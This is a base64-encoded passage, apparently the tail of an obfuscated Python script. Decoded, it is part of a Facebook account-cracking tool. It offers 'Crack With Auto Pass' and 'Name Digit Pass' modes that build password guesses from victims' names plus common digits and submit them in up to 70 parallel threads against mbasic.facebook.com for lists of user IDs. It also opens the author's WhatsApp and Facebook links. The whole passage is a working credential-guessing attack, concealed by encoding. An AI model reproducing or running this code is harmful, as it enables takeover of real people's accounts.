MzU2JywgY29va2llcz17J2Nvb2tpZSc6IGNva2l9KS50ZXh0LCAnaHRtbC5wYXJzZXInKQoKICAgICAgICBnZXQgPSByLmZpbmQoJ2EnLCBzdHJpbmc9J0lrdXRpJykuZ2V0KCdocmVmJykKCiAgICAgICAgc2Vzc2lvbi5nZXQoKCdodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20nICsgc3RyKGdldCkpLCBjb29raWVzPXsnY29va2llJzogY29raX0pLnRleHQKCiAgICBkZWYgX19wbGVyX18oc2VsZik6CgogICAgICAgIHByaW50KCcgWzFdIENyYWNrIFdpdGggQXV0byBQYXNzICcpCgogICAgICAgIHByaW50KCcgWzJdIENyYWNrIFdpdGggTmFtZSBEaWdpdCBQYXNzJykKCiAgICAgICAgY2hpID0gaW5wdXQoJ1xuIFs/XSBDaG9vc2U6ICcpCgogICAgICAgIGlmIGNoaSA9PSAnJzoKCiAgICAgICAgICAgIHByaW50KCdcbiAgIFNlbGVjdCBDb3JyZWN0IE9uZScpCgogICAgICAgICAgICBzZWxmLl9fcGxlcl9fKCkKCiAgICAgICAgZWxpZiBjaGkgaW4gKCcxJywgJzAxJyk6CgogICAgICAgICAgICBvcy5zeXN0ZW0oImNsZWFyIikKCiAgICAgICAgICAgIHByaW50KGxvZ28pCgogICAgICAgICAgICBwcmludCgiXDAzM1sxOzMybSAgICAgIERvbnQgRm9yZ2V0IEFsbGFo8J+YiiBcMDMzWzE7MzdtIikKCiAgICAgICAgICAgIHByaW50KCIgWyRdfn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+WyRdIikKCiAgICAgICAgICAgIAoKICAgICAgICAgICAgd2l0aCBzYXJmcmF6c3NiKG1heF93b3JrZXJzPTcwKSBhcyBzc2J3b3JsZDoKCiAgICAgICAgICAgICAgICBmb3IgenNiIGluIHNlbGYuaWQ6ICMgWW8gTmRhayBUYXUgS29rIFRhbnlhIFNhaWEKCiAgICAgICAgICAgICAgICAgICAgdHJ5OgoKICAgICAgICAgICAgICAgICAgICAgICAgdWlkLCBuYW1lID0genNiLnNwbGl0KCd8JykKCiAgICAgICAgICAgICAgICAgICAgICAgIHh6ID0gbmFtZS5zcGxpdCgnICcpCgogICAgICAgICAgICAgICAgICAgICAgICBpZiBsZW4oeHopID09IDMgb3IgbGVuKHh6KSA9PSA0IG9yIGxlbih4eikgPT0gNSBvciBsZW4oeHopID09IDY6CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHd4ID0gW25hbWUsIHh6WzBdK3h6WzFdXQogICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwd3ggPSBbbmFtZSwgeHpbMF0gKyAnbGFzdCcsIHh6WzBdICsgJ0ZyaXN0JywgeHpbMF0gKyAnTGFzdCddCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHB3eCA9IFtuYW1lLCB4elswXSt4elsxXV0KCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2U6CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHd4ID0gW0xhc3QsIHh6WzBdICsgJ0xhc3QxJywgeHpbMF0gKyAnZmlyc3QnLCB4elswXSArICdsYXN0MSddCgogICAgICAgICAgICAgICAgICAgICAgICBzc2J3b3JsZC5zdWJtaXQoc2VsZi5fX21ldG9kZV9fLCB1aWQsIHB3eCwgIm1iYXNpYy5mYWNlYm9vay5jb20iKQoKICAgICAgICAgICAgICAgICAgICBleGNlcHQ6CgogICAgICAgICAgICAgICAgICAgICAgICBwYXNzCgogICAgICAgICAgICBoYXNpbChvayxjcCkKCiAgICAgICAgZWxpZiBjaGkgaW4gKCcyJywgJzAyJyk6CgogICAgICAgICAgICBvcy5zeXN0ZW0oImNsZWFyIikKCiAgICAgICAgICAgIHByaW50KGxvZ28pCgogICAgICAgICAgICBwcmludCgiIikKCiAgICAgICAgICAgIHByaW50KCJcMDMzWzE7MzdtXHIgICBFbnRlciBMYXN0IE5hbWUgRGlnaXRzXDAzM1sxOzM3bVxuIikKCiAgICAgICAgICAgIHByaW50ICgiXDAzM1sxOzM3bVxyICAgRXhtcGxlIDogMTIzICsgMTIzNDUgKyAxMjM0ICsgMTEyMlwwMzNbMTszN21cbiIpCgogICAgICAgICAgICBwMSA9IGlucHV0KCcgICBOYW1lICsgMSA6ICcpCgogICAgICAgICAgICBwMiA9IGlucHV0KCcgICBOYW1lICsgMiA6ICcpCgogICAgICAgICAgICBwMyA9IGlucHV0KCcgICBOYW1lICsgMyA6ICcpCgogICAgICAgICAgICBwNCA9IGlucHV0KCcgICBOYW1lICsgNCA6ICcpCgogICAgICAgICAgICBvcy5zeXN0ZW0oImNsZWFyIikKCiAgICAgICAgICAgIHByaW50KGxvZ28pCgogICAgICAgICAgICBwcmludCgiXDAzM1sxOzMybSAgICAgIERvbnQgRm9yZ2V0IEFsbGFo8J+YiiBcMDMzWzE7MzdtIikKCiAgICAgICAgICAgIHByaW50KCIgWyRdfn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+fn5+WyRdIikKCiAgICAgICAgICAgIHdpdGggc2FyZnJhenNzYihtYXhfd29ya2Vycz0zMCkgYXMgc3Nid29ybGQ6CgogICAgICAgICAgICAgICAgZm9yIHpzYiBpbiBzZWxmLmlkOiAjIFlvIE5kYWsgVGF1IEtvayBUYW55YSBTYWlhCgogICAgICAgICAgICAgICAgICAgIHRyeToKCiAgICAgICAgICAgICAgICAgICAgICAgIHVpZCwgbmFtZSA9IHpzYi5zcGxpdCgnfCcpCgogICAgICAgICAgICAgICAgICAgICAgICB4eiA9IG5hbWUuc3BsaXQoJyAnKQoKICAgICAgICAgICAgICAgICAgICAgICAgaWYgbGVuKHh6KSA9PSAzIG9yIGxlbih4eikgPT0gNCBvciBsZW4oeHopID09IDUgb3IgbGVuKHh6KSA9PSA2OgoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHB3eCA9IFtuYW1lLCB4elswXSsiMTIzIiwgeHpbMF0reHpbMV0sIHh6WzBdKyIxMjM0NSJdCgogICAgICAgICAgICAgICAgICAgICAgICBlbHNlOgoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHB3eCA9IFtuYW1lLCB4elswXSsiMTIzIiwgeHpbMF0reHpbMV0sIHh6WzBdKyIxMjM0NSJdCgogICAgICAgICAgICAgICAgICAgICAgICBzc2J3b3JsZC5zdWJtaXQoc2VsZi5fX21ldG9kZV9fLCB1aWQsIHB3eCwgIm1iYXNpYy5mYWNlYm9vay5jb20iKQoKICAgICAgICAgICAgICAgICAgICBleGNlcHQ6CgogICAgICAgICAgICAgICAgICAgICAgICBwYXNzCgogICAgICAgICAgICBoYXNpbChvayxjcCkKCiAgICAgICAgZWxzZToKCiAgICAgICAgICAgIHByaW50KCdcbiBTZWxlY3QgVmFsaWQgT25lJykKCiAgICAgICAgICAgIHNlbGYuX19wbGVyX18oKQoKICAgICAgICAgICAgCgpkZWYgZHVwY3V0dGVyKCk6CgoJb3Muc3lzdGVtKCJ4ZGctb3BlbiBodHRwczovL3dhLm1lLys5MjMwNDcyNzQzOTMiKQoKCXRpbWUuc2xlZXAoMykKCglSKCkKCmRlZiB5dCgpOgoKCWxvZ28oKQoKCW9zLnN5c3RlbSgieGRnLW9wZW4gaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tLzM1NiIpCgoJdGltZS5zbGVlcCgzKQoKCVIoKQoKICAgIAoKY2xhc3MgbG9hZDoKCiAgICBkZWYgX19pbml0X18oc2VsZik6CgogICAgICAgIF8gPSAnJwoKICAgICAgICBfXyA9IGludCgnMzAnKQoKICAgICAgICBfX18gPSBpbnQoJzAnKQoKICAgICAgICBfXyAtPSAxCgogICAgICAgIF9fXyArPSAxCgogICAgICAgIGZvciB0IGluIHJhbmdlKGludCgiMSIpKToKCiAgICAgICAgICAgIHByaW50KCdcciBXYWl0IEJybyBMb2FkaW5nIC4uLicpCgogICAgICAgICAgICBzeXMuc3Rkb3V0LmZsdXNoKCkKCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMC4xKQoKICAgICAgICBwcmludCgnXG4nKQoKbWFpbl9hcHYoKQoK"))